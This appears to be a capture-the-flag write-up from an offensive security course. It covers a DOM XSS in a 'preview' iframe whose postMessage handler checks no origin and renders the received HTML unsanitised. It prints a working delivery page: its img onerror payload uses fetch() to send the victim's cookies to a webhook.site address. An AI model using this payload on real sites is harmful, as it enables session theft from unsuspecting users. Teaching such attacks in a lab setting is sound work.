# PigeonPost

**Category:** web / DOM XSS via unsafe `postMessage` handling · **Course:** Offensive Security (PoliTo)

## Vulnerability

The target page embeds a "preview" iframe that listens for `postMessage` events and injects the received `html` field directly into the DOM with no origin check on the sender and no sanitisation of the message contents — a textbook unsafe `postMessage` handler.

## Exploitation

A malicious page (`solution.html`) embeds the target's `/preview` endpoint in an `<iframe>`, waits for it to load, then posts a crafted message containing an `onerror`-triggered payload:

```html
<iframe id="preview" src="https://.../preview"></iframe>
<script>
  document.getElementById('preview').addEventListener('load', () => {
    preview.contentWindow.postMessage({
      html: `<img src=x onerror="fetch('https://webhook.site/...?cookie=' + encodeURIComponent(document.cookie))">`
    }, '*');
  });
</script>
```

Getting a victim to open this attacker-hosted page makes their browser load the target's preview iframe and receive the malicious `postMessage`, which the target then renders unsafely — running the payload in the target's origin and exfiltrating the victim's cookie for that site.

## Files

- `solution.html` — the delivery page: embeds the vulnerable iframe and sends the malicious `postMessage`

## Flag

`offsec{...redacted...}` — captured against the remote instance; redacted here per standard write-up etiquette.
